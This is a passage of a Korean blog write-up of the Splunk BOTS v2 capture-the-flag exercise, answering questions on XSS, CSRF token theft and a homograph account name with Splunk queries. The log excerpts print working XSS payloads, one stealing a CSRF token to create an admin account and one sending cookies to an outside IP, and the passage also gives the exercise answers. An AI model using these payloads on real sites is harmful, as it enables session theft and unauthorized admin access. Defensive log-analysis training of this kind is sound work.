+XSS 프로브가 표시하는 문자는 무엇입니까? 답변 안내: 현지어 또는 문자 집합으로 답변을 제출합니다.</p>
+
+<details>
+  <summary>hint#1</summary>
+    The attack is obscured in the logs by URL encoding.
+    공격은 URL 인코딩에 의해 로그에서 가려집니다.
+</details>
+
+<details>
+  <summary>hint#2</summary>
+    Splunk has the capability to URLdecode strings. Check your quick reference guide or Google for it.
+    Splunk에는 문자열을 URL 디코딩하는 기능이 있습니다. 빠른 참조 가이드 또는 Google을 확인하십시오.
+</details>
+
+<details>
+  <summary>hint#3</summary>
+    Try using | eval decoded_uri=urldecode(uri)
+    다음 SPL을 사용해보세요 | eval decoded_uri=urldecode(uri)
+</details>
+<details>
+  <summary>hint#4</summary>
+    Don't forget to check if others on your team have investigated this before.
+    팀의 다른 사람들이 전에 이것을 조사했는지 확인해보세요.
+</details>
+
+<p>XSS공격은 script를 이용한 공격입니다. 키워드 script가 있는 form_data를 조사해봅시다.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sourcetype=stream:http "&lt;script&gt;"
+| dedup form_data
+| table _time form_data src_ip
+</code></pre></div></div>
+
+<table>
+  <thead>
+    <tr>
+      <th>_time</th>
+      <th>form_data</th>
+      <th>src_ip</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>2017/08/16 15:19:17.163</td>
+      <td>module=user-titles&amp;action=edit&amp;utid=2%22%3E%3Cscript%3E%0Awindow.onload%3Dfunction(e)%7B%0A%20%20var%20my_post_key%20%3D%20document.getElementsByName(%22my_post_key%22)%5B0%5D.value%0A%20%20console.log(my_post_key)%3B%0A%20%20var%20postdata%3D%20%22my_post_key%3D%22%2Bmy_post_key%2B%22%26username%3DkIagerfield%26password%3Dbeer_lulz%26confirm_password%3Dbeer_lulz%26email%3DkIagerfield%40froth.ly%26usergroup%3D4%26additionalgroups%5B%5D%3D4%26displaygroup%3D4%22%3B%2F%2FPost%20the%20Data%0A%20%20var%20url%20%3D%20%22http%3A%2F%2Fwww.brewertalk.com%2Fadmin%2Findex.php%3Fmodule%3Duser-users%26action%3Dadd%22%3B%0A%20%20var%20http%3B%0A%20%20http%20%3D%20new%20XMLHttpRequest()%3B%0A%20%20http.open(%22Post%22%2Curl)%3B%0A%0A%20%20http.setRequestHeader(%27Accept%27%2C%27text%2Fhtml%27)%3B%0A%20%20http.setRequestHeader(%27Content-type%27%2C%27application%2Fx-www-form-urlencoded%27)%3B%0A%20%20http.setRequestHeader(%27Accept%27%2C%27application%2Fxhtml%2Bxml%27)%3B%0A%20%20http.setRequestHeader(%27Accept%27%2C%27application%2Fxml%27)%3B%0A%20%20http.send(postdata)%3B%0A%20%20console.log(my_post_key)%3B%0A%7D%0A%3C%2Fscript%3E</td>
+      <td>71.39.18.125</td>
+    </tr>
+    <tr>
+      <td>2017/08/15 23:36:34.915</td>
+      <td>action=activate&amp;uid=-1&amp;code=%22%3E%3Cscript%3Edocument.location%3D%22http%3A%2F%2F45.77.65.211%3A9999%2Fmicrosoftuserfeedbackservice%3Fmetric%3D%22%20%2B%20document.cookie%3B%3C%2Fscript%3E</td>
+      <td>71.39.18.125</td>
+    </tr>
+    <tr>
+      <td>2017/08/12 09:49:00.520</td>
+      <td>action=activate&amp;uid=-1&amp;code=%22%3E%3Cscript%3Ealert(%27%EB%8C%80%EB%8F%99%27)%3C%2Fscript%3E</td>
+      <td>136.0.0.125</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>내용이 base64인코딩되어 있습니다. urldecode함수를 통해 디코딩해봅시다.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sourcetype=stream:http "&lt;script&gt;"
+| dedup form_data
+| eval decoded=urldecode(form_data) 
+| table _time decoded src_ip
+</code></pre></div></div>
+
+<p><img src="https://wind-flow.github.io/assets/built/images/splunk/bots/v2/2021-11-02-12-01-02.png" alt="" /></p>
+
+<p>쿼리 결과 중 ‘대동’이라는 글자를 발견할 수 있습니다.</p>
+
+<p>답 : 대동</p>
+
+<p>207	What was the value of the cookie that Kevin’s browser transmitted to the malicious URL as part of a XSS attack? Answer guidance: All digits. Not the cookie name or symbols like an equal sign.<br />
+XSS 공격의 일환으로 Kevin의 브라우저가 악성 URL에 전송한 쿠키값은 무엇이었습니까? 답변 안내: 모두 숫자입니다. 쿠키 이름이나 등호와 같은 기호가 아닙니다.</p>
+
+<details>
+  <summary>hint#1</summary>
+    Check out sourcetype=stream:http
+    sourcetype stream:http를 확인해보세요.
+</details>
+
+<details>
+  <summary>hint#2</summary>
+    Inspect the uri_query field.
+    uri_query 필드를 검사합니다.
+</details>
+
+<p>kevin의 브라우저에서 XSS공격으로 인한 쿠키값이 탈취되었습니다. 키워드 kevin, “<script>", cookie를 넣어 검색해 봅시다.</script></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sourcetype=stream:http *kevin* "&lt;script&gt;" *cookie*
+</code></pre></div></div>
+
+<p>1개의 검색결과가 나왔습니다.</p>
+
+<p>내용 중 class=”username”&gt;kevin&lt;/a&gt;&lt;/span&gt;라는 항목이 있는것을 보니 kevin과 관련된 이벤트입니다.</p>
+
+<p>또, cookie 필드값은 다음과 같습니다.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mybb[lastvisit]=1502408189; mybb[lastactive]=1502408191; sid=4a06e3f4a6eb6ba1501c4eb7f9b25228; adminsid=9267f9cec584473a8d151c25ddb691f1; acploginattempts=0
+</code></pre></div></div>
+
+<p>여러개의 값 중 lastvisit이 마지막 방문시 쓰였던 쿠키값임을 알 수 있습니다.</p>
+
+<p>답 : 1502408189</p>
+
+<p>208	The brewertalk.com web site employed Cross Site Request Forgery (CSRF) techniques. What was the value of the anti-CSRF token that was stolen from Kevin Lagerfield’s computer and used to help create an unauthorized admin user on brewertalk.com?<br />
+brewertalk.com 웹 사이트는 CSRF(Cross Site Request Forgery) 기술을 사용했습니다. Kevin Lagerfield의 컴퓨터에서 도난당하여 brewertalk.com에서 승인되지 않은 관리자를 생성하는 데 사용된 anti-CSRF 토큰 값은 무엇입니까?</p>
+
+<details>
+  <summary>hint#1</summary>
+    Anti-CSRF tokens are usually hidden form elements set when the browser loads an HTML page containing a form. If the form is submitted without the anti-CSRF token, the backend code of the website rejects the transaction as it might have come from a malicious source rather than from a legitimate user of the form.<br />
+    Anti-CSRF 토큰은 일반적으로 브라우저가 양식을 포함하는 HTML 페이지를 로드할 때 설정된 숨겨진 양식 요소입니다. 안티 CSRF 토큰 없이 양식을 제출하는 경우 웹사이트의 백엔드 코드는 해당 양식의 합법적인 사용자가 아닌 악의적인 소스에서 온 것일 수 있으므로 트랜잭션을 거부합니다.
+</details>
+<details>
+  <summary>hint#2</summary>
+    One of the many ways that an attacker can abuse a cross site scripting vulnerability is to use it to defeat CSRF protections. If you carefully inspect XSS attacks in the data set, you will stumble on some malicious code that is stealing the anti-CSRF token.<br />
+    공격자가 크로스 사이트 스크립팅 취약점을 악용할 수 있는 여러 방법 중 하나는 이를 사용하여 CSRF 보호를 무력화하는 것입니다. 데이터 셋에서 XSS 공격을 주의 깊게 검사하면 anti-CSRF token을 훔치는 일부 악성 코드를 발견하게 될 것입니다.
+</details>
+
+<details>
+  <summary>hint#3</summary>
+    On brewertalk.com, users created with usergroup=4 are administrators.<br />
+    brewertalk.com에서 usergroup=4로 생성된 사용자는 관리자입니다.
+</details>
+
+<p>CSRF 토큰이란, CSRF공격 대응하기 위해 클라이언트에서 서버로 요청할때 실제 서버에서 허용한 요청이 맞는지 확인하기 위한 값을 말합니다.</p>
+
+<p><a href="https://codevang.tistory.com/282">csrf 토큰이란?</a></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sourcetype="stream:http" 
+| reverse 
+| search "input type="hidden""
+</code></pre></div></div>
+
+<p>아래 결과를 발견할 수 있습니다.
+input type=”hidden” name=”my_post_key” value=”1bc3eab741900ab25c98eee86bf20feb</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sourcetype="stream:http" 1bc3eab741900ab25c98eee86bf20feb 
+| reverse
+| table form_data
+</code></pre></div></div>
+<p>아래와 같이 조회 됩니다.</p>
+
+<pre><code class="language-my_post_key=1bc3eab741900ab25c98eee86bf20feb&amp;username=kIagerfield&amp;password=beer_lulz&amp;confirm_password=beer_lulz&amp;email=kIagerfield@froth.ly&amp;usergroup=4&amp;additionalgroups[]=4&amp;displaygroup=4```">
+답 : 1bc3eab741900ab25c98eee86bf20feb
+
+209	What brewertalk.com username was maliciously created by a spearphishing attack?  
+스피어피싱 공격에 의해 악의적으로 생성된 brewertalk.com 사용자 이름은 무엇입니까?
+
+&lt;details&gt;
+  &lt;summary&gt;hint#1&lt;/summary&gt;
+    The attacker was trying to masquerade as something that would look legitimate to a casual observer.&lt;br&gt;
+    공격자는 관찰자에게 그럴듯하게 보이려고 가장했습니다.
+&lt;/details&gt;
+
+&lt;details&gt;
+  &lt;summary&gt;hint#2&lt;/summary&gt;
+    The attacker stole a trick from domain squatters by using a homograph attack. More info on homograph attacks can be found on Wikipedia.&lt;br&gt;
+    공격자는 동형이의어(homograph) 공격을 사용하여 도메인 관리자로부터 속였습니다. 동형이의어 공격에 대한 자세한 내용은 Wikipedia에서 찾을 수 있습니다.
+&lt;/details&gt;
+
+&lt;details&gt;
+  &lt;summary&gt;hint#3&lt;/summary&gt;
+    The password of this new, unauthorized, malicious administrative account is beer_lulz.&lt;br&gt;
+    새로운 승인되지 않은 악의적인 관리 계정의 암호는 beer_lulz입니다.
+&lt;/details&gt;
+
+스피어 피싱(spear phishing)이란, 특정한 개인이나 회사들을 대상으로 시도하는 피싱을 스피어 피싱입니다.
+
+힌트#3을 보면 계정의 암호는 "beer_lulz"입니다. 해당 암호를 키워드로 검색해봅니다.
+
+</code></pre>
+<p>sourcetype=”stream:http” beer_lulz
+```</p>
+
+<p>form_data필드 값이 아래와 같습니다.<br />
+<code class="language-plaintext highlighter-rouge">form_data: username=kIagerfield&amp;password=beer_lulz&amp;do=login</code></p>
+
+<p>유저이름은 kIagerfield입니다.
+힌트#2에서 <a href="https://ko.wikiqube.net/wiki/IDN_homograph_attack">동형이의어 공격</a>을 사용했다고 알려주었으므로, 원래 이름은 두번째글자에서 대문자 I가 아닌, 소문자 l일 가능성이 높습니다.</p>
+
+<p>답 : kIagerfield</p>
+
+                </div>
+            </section>
+
+            <!-- Email subscribe form at the bottom of the page -->
+            <!-- 
+                <section class="subscribe-form">
+                    <h3 class="subscribe-form-title">Subscribe to wind-flow Tech Blog</h3>
+                    <p>Get the latest posts delivered right to your inbox</p>
+                    <span id="searchform" method="post" action="/subscribe/" class="">
+    <input class="confirm" type="hidden" name="confirm"  />
+    <input class="location" type="hidden" name="location"  />
+    <input class="referrer" type="hidden" name="referrer"  />
+
+    <div class="form-group">
+        <input class="subscribe-email" onkeyup="myFunc()" 
+               id="searchtext" type="text" name="searchtext"  
+               placeholder="Search..." />
+    </div>
+    <script type="text/javascript">
+        function myFunc() {
+            if(event.keyCode == 13) {
+                var url = encodeURIComponent($("#searchtext").val());
+                location.href = "/search.html?query=" + url;
+            }
+        }
+    </script>
+</span>
+                </section>
+             -->
+
+            <footer class="post-full-footer">
+                <!-- Everything inside the #author tags pulls data from the author -->
+                <!-- #author-->
+                
+                    
+                        <section class="author-card">
+                            
+                                <img class="author-profile-image" src="/assets/images/profile.png" alt="wind-flow" />
+                            
+                            <section class="author-card-content">
+                                <h4 class="author-card-name"><a href="/author/wind-flow">Kim-Gunwoo</a></h4>
+                                
+                                    <p>Finance Security IT Analyst</p>
+                                
+                            </section>
+                        </section>
+                        <div class="post-full-footer-right">
+                            <a class="author-card-button" href="/author/wind-flow">Read More</a>
+                        </div>
+                    
+                
+                <!-- /author  -->
+            </footer>
+
+            <!-- If you use Disqus comments, just uncomment this block.
+            The only thing you need to change is "test-apkdzgmqhj" - which
+            should be replaced with your own Disqus site-id. -->
+            
+                <section class="post-full-comments">
+                    <div id="disqus_thread"></div>
+                    <script>
+                        var disqus_config = function () {
+                            var this_page_url = 'https://wind-flow.github.io/splunk-BOTS-v2-part2';
+                            var this_page_identifier = '/splunk-BOTS-v2-part2';
+                            var this_page_title = 'splunk-bots-v2 write up(2)';
+                        };
+                        (function() {
+                            var d = document, s = d.createElement('script');
+                            s.src = 'https://xxxxxxxx.disqus.com/embed.js';
+                            s.setAttribute('data-timestamp', +new Date());
+                            (d.head || d.body).appendChild(s);
+                        })();
+                    </script>
+                </section>
+            
+
+        </article>
+
+    </div>
+</main>
+
+<!-- Links to Previous/Next posts -->
+<aside class="read-next outer">
+    <div class="inner">
+        <div class="read-next-feed">
+            
+                
+                
+                
+                
+                    <article class="read-next-card"
+                        
+                            style="background-image: url(/assets/images/sevenpuzzle.jpg)"
+                        
+                    >
+                        <header class="read-next-card-header">
+                            <small class="read-next-card-header-sitetitle">&mdash; wind-flow Tech Blog &mdash;</small>
+                            
+                                <h3 class="read-next-card-header-title"><a href="/tag/splunk/">Splunk</a></h3>
+                            
+                        </header>
+                        <div class="read-next-divider"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 14.5s2 3 5 3 5.5-2.463 5.5-5.5S21 6.5 18 6.5c-5 0-7 11-12 11C2.962 17.5.5 15.037.5 12S3 6.5 6 6.5s4.5 3.5 4.5 3.5"/></svg>
+</div>
+                        <div class="read-next-card-content">
+                            <ul>
+                                
+                                
+                                  
+                                
+                                  
+                                    
+                                        
+                                        
+                                            <li><a href="/splunk-2021-BOTS-END">splunk 2021 bots 결과</a></li>
+                                        
+                                    
+                                  
+                                
+                                  
+                                    
+                                        
+                                        
+                                            <li><a href="/splunk-BOTS-v3-part4">splunk-bots-v3 write up(4) - END</a></li>
+                                        
+                                    
+                                  
+                                
+                                  
+                                    
+                                        
+                                        
+                                            <li><a href="/splunk-BOTS-v3-part3">splunk-bots-v3 write up(3)</a></li>
+                                        
+                                    
+                                  
+                                
+                                  
+                                    
+                                        
+                                        
+                                    
+                                  
+                                
+                                  
+                                    
+                                        
+                                        
+                                    
+                                  
+                                
+                                  
+                                    
+                                        
+                                        
+                                    
+                                  
+                                
+                                  
+                                    
+                                        
+                                        
+                                    
+                                  
+                                
+                                  
+                                    
+                                        
+                                        
+                                    
+                                  
+                                
+                                  
+                                    
+                                  
+                                
+                                  
+                                    
+                                        
+                                        
+                                    
+                                  
+                                
+                                  
+                                    
+                                        
+                                        
+                                    
+                                  
+                                
+                                  
+                                    
+                                        
+                                        
+                                    
+                                  
+                                
+                                  
+                                    
+                                        
+                                        
+                                    
+                                  
+                                
+                            </ul>
+                        </div>
+                        <footer class="read-next-card-footer">
+                            <a href="/tag/splunk/">
+                                
+                                    See all 12 posts  →
+                                
+                            </a>
+                        </footer>
+                    </article>
+                
+            
+
+            <!-- If there's a next post, display it using the same markup included from - partials/post-card.hbs -->
+            
+                
+
+    <article class="post-card post-template">
+        
+            <a class="post-card-image-link" href="/splunk-BOTS-v2-part3">
+                <div class="post-card-image" style="background-image: url(/assets/built/images/splunk/bots/v2/bots-v2.jpg)"></div>
+            </a>
+        
+        <div class="post-card-content">
+            <a class="post-card-content-link" href="/splunk-BOTS-v2-part3">
+                <header class="post-card-header">
+                    
+                        
+                            
+                                <span class="post-card-tags">Splunk</span>
+                            
+                        
+                    
+
+                    <h2 class="post-card-title">splunk-bots-v2 write up(3)</h2>
+                </header>
+                <section class="post-card-excerpt">
+                    
+                        <p>Splunk BOTS의 데이터셋은 3개입니다. BOTS란? BOTS v1 Write up(1) BOTS v1 Write up(2) - END BOTS v2 Write up(1) BOTS v2 Write up(2) BOTS v2 Write up(3) BOTS v2 Write up(4) BOTS v2</p>
+                    
+                </section>
+            </a>
+            <footer class="post-card-meta">
+                
+                    
+                        
+                        <img class="author-profile-image" src="/assets/images/profile.png" alt="Kim-Gunwoo" />
+                        
+                        <span class="post-card-author">
+                            <a href="/author/wind-flow/">Kim-Gunwoo</a>
+                        </span>
+                    
+                
+                <span class="reading-time">
+                    
+                    
+                      12 min read
+                    
+                </span>
+            </footer>
+        </div>
+    </article>
+
+            
+
+            <!-- If there's a previous post, display it using the same markup included from - partials/post-card.hbs -->
+            
+                
+
+    <article class="post-card post-template">
+        
+            <a class="post-card-image-link" href="/splunk-BOTS-v2-part1">
+                <div class="post-card-image" style="background-image: url(/assets/built/images/splunk/bots/v2/bots-v2.jpg)"></div>
+            </a>
+        
+        <div class="post-card-content">
+            <a class="post-card-content-link" href="/splunk-BOTS-v2-part1">
+                <header class="post-card-header">
+                    
+                        
+                            
+                                <span class="post-card-tags">Splunk</span>
+                            
+                        
+                    
+
+                    <h2 class="post-card-title">splunk-bots-v2 write up(1)</h2>
+                </header>
+                <section class="post-card-excerpt">
+                    
+                        <p>Splunk BOTS의 데이터셋은 3개입니다. BOTS란? BOTS v1 Write up(1) BOTS v1 Write up(2) - END BOTS v2 Write up(1) BOTS v2 Write up(2) BOTS v2 Write up(3) BOTS v2 Write up(4) BOTS v2</p>
+                    
+                </section>
+            </a>
+            <footer class="post-card-meta">
+                
+                    
+                        
+                        <img class="author-profile-image" src="/assets/images/profile.png" alt="Kim-Gunwoo" />
+                        
+                        <span class="post-card-author">
+                            <a href="/author/wind-flow/">Kim-Gunwoo</a>
+                        </span>
+                    
+                
+                <span class="reading-time">
+                    
+                    
+                      10 min read
+                    
+                </span>
+            </footer>
+        </div>
+    </article>
+
+            
+
+        </div>
+    </div>
+</aside>
+
+<!-- Floating header which appears on-scroll, included from includes/floating-header.hbs -->
+<div class="floating-header">
+    <div class="floating-header-logo">
+        <a href="https://wind-flow.github.io/">
+            
+            <span>wind-flow Tech Blog</span>
+        </a>
+    </div>
+    <span class="floating-header-divider">&mdash;</span>
+    <div class="floating-header-title">splunk-bots-v2 write up(2)</div>
+    <div class="floating-header-share">
+        <div class="floating-header-share-label">Share this <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+    <path d="M7.5 15.5V4a1.5 1.5 0 1 1 3 0v4.5h2a1 1 0 0 1 1 1h2a1 1 0 0 1 1 1H18a1.5 1.5 0 0 1 1.5 1.5v3.099c0 .929-.13 1.854-.385 2.748L17.5 23.5h-9c-1.5-2-5.417-8.673-5.417-8.673a1.2 1.2 0 0 1 1.76-1.605L7.5 15.5zm6-6v2m-3-3.5v3.5m6-1v2"/>
+</svg>
+</div>
+        <a class="floating-header-share-tw" href="https://twitter.com/share?text=splunk-bots-v2+write+up%282%29&amp;url=https://wind-flow.github.io/splunk-BOTS-v2-part2"
+            onclick="window.open(this.href, 'share-twitter', 'width=550,height=235');return false;">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"/></svg>
+
+        </a>
+        <a class="floating-header-share-fb" href="https://www.facebook.com/sharer/sharer.php?u=https://wind-flow.github.io/splunk-BOTS-v2-part2"
+            onclick="window.open(this.href, 'share-facebook','width=580,height=296');return false;">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M19 6h5V0h-5c-3.86 0-7 3.14-7 7v3H8v6h4v16h6V16h5l1-6h-6V7c0-.542.458-1 1-1z"/></svg>
+
+        </a>
+    </div>
+    <progress class="progress" value="0">
+        <div class="progress-container">
+            <span class="progress-bar"></span>
+        </div>
+    </progress>
+</div>
+
+
+<!-- /post -->
+
+<!-- The #contentFor helper here will send everything inside it up to the matching #block helper found in default.hbs -->
+
+
+        <!-- Previous/next page links - displayed on every page -->
+        
+
+        <!-- The footer at the very bottom of the screen -->
+        <footer class="site-footer outer">
+            <div class="site-footer-content inner">
+                <section class="copyright"><a href="https://wind-flow.github.io/">wind-flow Tech Blog</a> &copy; 2022</section>
+                <section class="poweredby">Proudly published with <a href="https://jekyllrb.com/">Jekyll</a> &
+                    <a href="https://pages.github.com/" target="_blank" rel="noopener">GitHub Pages</a> using
+                    <a href="https://github.com/jekyllt/jasper2" target="_blank" rel="noopener">Jasper2</a></section>
+                <nav class="site-footer-nav">
+                    <a href="/">Latest Posts</a>
+                    
+                    
+                    <a href="https://ghost.org" target="_blank" rel="noopener">Ghost</a>
+                </nav>
+            </div>
+        </footer>
+
+    </div>
+
+    <!-- The big email subscribe modal content -->
+    
+    <div id="subscribe" class="subscribe-overlay">
+        <a class="subscribe-overlay-close" href="#"></a>
+        <div class="subscribe-overlay-content">
+            
+            <h1 class="subscribe-overlay-title">Search wind-flow Tech Blog</h1>
+            <p class="subscribe-overlay-description">
+            lunr.js를 이용한 posts 검색 </p>
+            <span id="searchform" method="post" action="/subscribe/" class="">
+    <input class="confirm" type="hidden" name="confirm"  />
+    <input class="location" type="hidden" name="location"  />
+    <input class="referrer" type="hidden" name="referrer"  />
+
+    <div class="form-group">
+        <input class="subscribe-email" onkeyup="myFunc()" 
+               id="searchtext" type="text" name="searchtext"  
+               placeholder="Search..." />
+    </div>
+    <script type="text/javascript">
+        function myFunc() {
+            if(event.keyCode == 13) {
+                var url = encodeURIComponent($("#searchtext").val());
+                location.href = "/search.html?query=" + url;
+            }
+        }
+    </script>
+</span>
+        </div>
+    </div>
+    
+
+    <!-- highlight.js -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.10.0/components/prism-abap.min.js"></script>
+    <script>$(document).ready(function() {
+      $('pre code').each(function(i, block) {
+        hljs.highlightBlock(block);
+      });
+    });</script>
+
+    <!-- jQuery + Fitvids, which makes all video embeds responsive -->
+    <script
+        src="https://code.jquery.com/jquery-3.2.1.min.js"
+        integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4="
+        crossorigin="anonymous">
+    </script>
+    <script type="text/javascript" src="/assets/js/jquery.fitvids.js"></script>
+    <script type="text/javascript" src="https://demo.ghost.io/assets/js/jquery.fitvids.js?v=724281a32e"></script>
+
+
+    <!-- Paginator increased to "infinit" in _config.yml -->
+    <!-- if paginator.posts  -->
+    <!-- <script>
+        var maxPages = parseInt('');
+    </script>
+    <script src="/assets/js/infinitescroll.js"></script> -->
+    <!-- /endif -->
+
+    
+
+
+    <!-- Add Google Analytics  -->
+    <!-- Google Analytics Tracking code -->
+ <script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-xxxxxxxx-x', 'auto');
+  ga('send', 'pageview');
+
+ </script>
+
+
+    <!-- The #block helper will pull in data from the #contentFor other template files. In this case, there's some JavaScript which we only want to use in post.hbs, but it needs to be included down here, after jQuery has already loaded. -->
+    
+        <script>
+
+// NOTE: Scroll performance is poor in Safari
+// - this appears to be due to the events firing much more slowly in Safari.
+//   Dropping the scroll event and using only a raf loop results in smoother
+//   scrolling but continuous processing even when not scrolling
+$(document).ready(function () {
+    // Start fitVids
+    var $postContent = $(".post-full-content");
+    $postContent.fitVids();
+    // End fitVids
+
+    var progressBar = document.querySelector('progress');
+    var header = document.querySelector('.floating-header');
+    var title = document.querySelector('.post-full-title');
+
+    var lastScrollY = window.scrollY;
+    var lastWindowHeight = window.innerHeight;
+    var lastDocumentHeight = $(document).height();
+    var ticking = false;
+
+    function onScroll() {
+        lastScrollY = window.scrollY;
+        requestTick();
+    }
+
+    function onResize() {
+        lastWindowHeight = window.innerHeight;
+        lastDocumentHeight = $(document).height();
+        requestTick();
+    }
+
+    function requestTick() {
+        if (!ticking) {
+            requestAnimationFrame(update);
+        }
+        ticking = true;
+    }
+
+    function update() {
+        var trigger = title.getBoundingClientRect().top + window.scrollY;
+        var triggerOffset = title.offsetHeight + 35;
+        var progressMax = lastDocumentHeight - lastWindowHeight;
+
+        // show/hide floating header
+        if (lastScrollY >= trigger + triggerOffset) {
+            header.classList.add('floating-active');
+        } else {
+            header.classList.remove('floating-active');
+        }
+
+        progressBar.setAttribute('max', progressMax);
+        progressBar.setAttribute('value', lastScrollY);
+
+        ticking = false;
+    }
+
+    window.addEventListener('scroll', onScroll, {passive: true});
+    window.addEventListener('resize', onResize, false);
+
+    update();
+});
+</script>
+
+    
+
+    <!-- Ghost outputs important scripts and data with this tag - it should always be the very last thing before the closing body tag -->
+    <!-- ghost_foot -->
+
+</body>
+</html>
